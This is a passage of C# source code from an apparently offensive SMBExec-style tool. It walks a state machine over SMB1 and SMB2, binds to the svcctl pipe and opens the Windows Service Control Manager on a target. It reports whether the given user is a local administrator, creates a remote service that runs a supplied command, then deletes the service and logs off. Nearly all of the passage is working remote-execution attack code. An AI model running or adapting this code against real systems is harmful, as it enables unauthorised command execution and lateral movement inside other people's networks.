                                            SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "CloseServiceHandle";
                                            SMB_close_service_handle_stage = 1;
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }
                                        break;
                                    case "CloseServiceHandle":
                                        {
                                            OrderedDictionary packet_SCM_data = new OrderedDictionary();
                                            if(SMB_close_service_handle_stage == 1)
                                            {
                                                Console.WriteLine("Service {0} deleted on {1}", SMB_service, target);
                                                SMB_close_service_handle_stage++;
                                                packet_SCM_data = GetPacketSCMCloseServiceHandle(SMB_service_context_handle);
                                            }
                                            else
                                            {
                                                SMBClientStage = "CloseRequest";
                                                packet_SCM_data = GetPacketSCMCloseServiceHandle(SMB_service_manager_context_handle);
                                            }
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x05, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, null);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, RPC_data);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SCM_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "CloseRequest":
                                        {
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x04 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBCloseRequest(new byte[] { 0x00, 0x40 });
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "TreeDisconnect";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "TreeDisconnect":
                                        {
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x71 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBTreeDisconnectRequest();
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "Logoff";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "Logoff":
                                        {
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x74 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0x34, 0xfe }, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBLogoffAndXRequest();
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "exit";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                }

                            }
                        }
                        else
                        {
                            SMBClientStage = "TreeConnect";
                            while (SMBClientStage != "exit" && SMBExec_failed == false)
                            {
                                switch (SMBClientStage)
                                {
                                    case "TreeConnect":
                                        {
                                            SMB2_message_ID++;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x03, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };

                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2TreeConnectRequest(SMB_path_bytes);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "CreateRequest";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "CreateRequest":
                                        {
                                            SMB2_tree_ID = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                            SMB_named_pipe_bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                            SMB2_message_ID++;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x05, 0x0 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2CreateRequestFile(SMB_named_pipe_bytes);
                                            packet_SMB2_data["SMB2CreateRequestFIle_Share_Access"] = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "RPCBind";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "RPCBind":
                                        {
                                            SMB_named_pipe_bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                            SMB2_message_ID++;
                                            SMB_file_ID = getByteRange(SMBClientReceive, 132, 147);
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_RPC_data = GetPacketRPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x0, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadRequest";
                                            SMB_client_stage_next = "OpenSCManagerW";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "ReadRequest":
                                        {
                                            Thread.Sleep(sleep*1000);
                                            SMB2_message_ID++;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x08, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            packet_SMB2_header["SMB2Header_CreditCharge"] = new byte[] { 0x10, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2ReadRequest(SMB_file_ID);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            if(BitConverter.ToString(getByteRange(SMBClientReceive,12,15)) != "03-01-00-00")
                                            {
                                                SMBClientStage = SMB_client_stage_next;
                                            }
                                            else
                                            {
                                                SMBClientStage = "StatusPending";
                                            }

                                        }
                                    if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    break;

                                    case "StatusPending":
                                        {
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            if (BitConverter.ToString(getByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                            {
                                                SMBClientStage = SMB_client_stage_next;
                                            }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "OpenSCManagerW":
                                        {
                                            SMB2_message_ID = 30;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] {0x09,0x00}, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SCM_data = GetPacketSCMOpenSCManagerW(SMB_service_bytes, SMB_service_length);
                                            SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            int RPC_data_Length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, SCM_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadRequest";
                                            SMB_client_stage_next = "CheckAccess";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }
                                        break;

                                    case "CheckAccess":
                                        {
                                            if (BitConverter.ToString(getByteRange(SMBClientReceive, 128, 131)) == "00-00-00-00" && BitConverter.ToString(getByteRange(SMBClientReceive, 108, 127)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                            {
                                                SMB_service_manager_context_handle = getByteRange(SMBClientReceive, 108, 127);
                                                if (SMB_execute)
                                                {
                                                    Console.WriteLine("{0} is a local administrator on {1}", output_username, target);
                                                    OrderedDictionary packet_SCM_data = GetPacketSCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                                    SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                    if (SCM_data.Length < SMB_split_index)
                                                    {
                                                        SMBClientStage = "CreateServiceW";
                                                    }
                                                    else
                                                    {
                                                        SMBClientStage = "CreateServiceW_First";
                                                    }
                                                }
                                                else
                                                {
                                                    Console.WriteLine("{0} is a local administrator on {1}", output_username, target);
                                                    SMB2_message_ID += 20;
                                                    SMB_close_service_handle_stage = 2;
                                                    SMBClientStage = "CloseServiceHandle";
                                                }

                                            }
                                            else if (BitConverter.ToString(getByteRange(SMBClientReceive, 128,131)) == "05-00-00-00")
                                            {
                                                Console.WriteLine("{0} is not a local administrator or does not have the required privileges on {1}", output_username, target);
                                                SMBExec_failed = true;
                                            }
                                            else
                                            {
                                                Console.WriteLine("Something went wrong with {0}", target);
                                                SMBExec_failed = true;
                                            }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }
                                        break;

                                    case "CreateServiceW":
                                        {
                                            if (SMBExec_command.Length < SMB_split_index)
                                            {
                                                SMB2_message_ID += 20;
                                                packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                                packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                                if (SMB_signing)
                                                {
                                                    packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                }
                                                OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                                byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                                OrderedDictionary packet_SMB_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                                byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                                byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                                int RPC_data_Length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                                OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_Length);
                                                byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                                if (SMB_signing)
                                                {
                                                    HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                    byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                    SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                    SMB2_Sign = CombineByteArray(SMB2_Sign, SCM_data);
                                                    byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                    SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                    packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                    SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                                }
                                                SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                                SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                                SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                                SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                                SMBClientStream.Flush();
                                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                                SMBClientStage = "ReadRequest";
                                                SMB_client_stage_next = "StartServiceW";
                                            if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                        }
                                            else
                                            {
                                                //nothing here.
                                            }
                                        }
                                        break;
                                    case "CreateServiceW_First":
                                        {
                                            SMB_split_stage_final = Math.Ceiling((double)SCM_data.Length / SMB_split_index);
                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            byte[] SCM_data_first = getByteRange(SCM_data, 0, SMB_split_index - 1);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_first);
                                            packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length);
                                            SMB_split_index_tracker = SMB_split_index;
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
